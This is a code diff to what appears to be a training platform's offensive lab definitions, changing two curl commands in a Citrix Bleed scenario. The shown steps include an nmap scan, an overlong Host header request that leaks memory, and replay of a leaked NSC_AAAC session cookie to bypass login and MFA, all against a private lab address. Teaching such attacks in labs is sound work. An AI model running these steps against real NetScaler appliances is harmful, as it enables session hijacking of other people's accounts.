@@ -169,7 +169,7 @@ export const offensiveBatch2Labs: LabScenario[] = [
         why: 'This is the real shape of the Citrix Bleed trigger — an overlong value in a header the appliance doesn\'t bounds-check against a fixed internal buffer, causing it to read past the end and echo adjacent memory (here, a live session token) back in the response.',
       },
       {
-        text: 'Reuse the leaked session token as your own Cookie: curl -H "Cookie: NSC_AAAC=deadbeef1234567890abcdef" 10.10.140.5/admin/dashboard',
+        text: 'Reuse the leaked session token as your own Cookie: curl -H "Cookie: NSC_AAAC=deadbeef1234567890abcdef" 10.10.140.5:443/admin/dashboard',
         why: 'This is the step that makes the leak dangerous in practice — NetScaler trusts a valid-looking session token at face value, so presenting someone else\'s captured token grants their exact authenticated (and MFA-cleared) session with no password or second factor required at all.',
       },
     ],
@@ -177,7 +177,7 @@ export const offensiveBatch2Labs: LabScenario[] = [
       'nmap -sV 10.10.140.5',
       'curl -H "Host: AAAAAAAAAAAAAAAAAAAAAAAA" 10.10.140.5:443/oauth/idp/.well-known/openid-configuration  — the overlong Host header is the actual trigger.',
       'The leaked response contains a session token starting with "NSC_AAAC=" — copy that exact value.',
-      'curl -H "Cookie: NSC_AAAC=deadbeef1234567890abcdef" 10.10.140.5/admin/dashboard  — reusing the leaked token bypasses login and MFA entirely.',
+      'curl -H "Cookie: NSC_AAAC=deadbeef1234567890abcdef" 10.10.140.5:443/admin/dashboard  — reusing the leaked token bypasses login and MFA entirely.',
     ],
     totalFlags: 1,
     attacker: attacker(),
